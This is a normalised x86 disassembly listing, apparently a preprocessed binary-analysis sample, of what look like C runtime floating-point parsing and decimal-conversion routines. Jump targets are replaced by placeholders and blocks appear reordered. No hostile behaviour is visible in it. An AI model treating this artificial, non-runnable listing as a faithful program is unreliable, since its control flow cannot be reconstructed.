lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10012b54
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_10011e1c
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_10007d33
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100077ee
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_10007d33
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
